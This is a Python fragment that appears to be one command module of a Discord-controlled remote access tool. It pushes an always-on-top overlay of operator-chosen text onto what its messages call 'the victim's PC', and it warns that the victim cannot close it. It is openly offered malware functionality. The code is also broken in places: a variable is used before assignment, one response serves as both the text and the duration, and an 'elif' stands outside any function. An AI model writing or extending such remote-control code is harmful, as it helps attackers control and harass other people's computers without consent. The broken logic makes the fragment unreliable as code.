import sys
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget, QMessageBox
from PyQt5.QtGui import QColor, QFont, QPainter, QPen
from PyQt5.QtCore import Qt, QTimer
import asyncio
class OverlayWindow(QWidget):
    def __init__(self, text, duration):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.text = text
        self.duration = duration
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.close)
        self.timer.start(self.duration * 1000)  # Close the overlay after specified seconds
        self.initUI()
    def initUI(self):
        layout = QVBoxLayout()
        label = QLabel(self.text)
        font = QFont("Arial", 20)
        label.setFont(font)
        layout.addWidget(label)
        self.setLayout(layout)
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setPen(QPen(Qt.black, 2, Qt.SolidLine))
        painter.setBrush(QColor(255, 255, 255, 150))
        painter.drawRoundedRect(self.rect(), 10, 10)
async def display_pinned_text(text, duration):
    app = QApplication(sys.argv)
    overlay = OverlayWindow(text, duration)
    overlay.setGeometry(100, 100, 400, 100) 
    overlay.show()
    try:
        await asyncio.sleep(duration)
        overlay.close()
    except asyncio.CancelledError:
        overlay.close()
    sys.exit(app.exec_())
async def start_overlay():
    message = await message.channel.send("Please send the pinned message that you want to display onto the victim's PC with the amount of time to be displayed in seconds.")
    def check(m):
        return m.author == message.author and m.channel == message.channel
    try:
        response = await client.wait_for('message', timeout=60.0, check=check)
        duration = int(response.content)
    except asyncio.TimeoutError:
        await message.channel.send('No response received. Aborting.')
        return
    confirmation_message = await message.channel.send(f'Are you sure you want to display the following text to the victim\'s PC?\nText: {response.content}\nDuration: {duration} seconds\nPlease note that the text cannot be stopped until the timer goes off or the victim shuts down the PC or ends the process.\nIf you wish to continue, react with: âœ… If not, react with ðŸ”´.')
    await confirmation_message.add_reaction('âœ…')
    await confirmation_message.add_reaction('ðŸ”´')
    def reaction_check(reaction, user):
        return user == message.author and str(reaction.emoji) in ['âœ…', 'ðŸ”´'] and reaction.message.id == confirmation_message.id
    try:
        reaction, _ = await client.wait_for('reaction_add', timeout=60.0, check=reaction_check)
    except asyncio.TimeoutError:
        await message.channel.send('Confirmation timed out.')
        return
    if str(reaction.emoji) == 'âœ…':
        await display_pinned_text(response.content, duration)
    else:
        await message.channel.send('Process cancelled.')
elif message.content == '.overlay-text':
    await start_overlay()
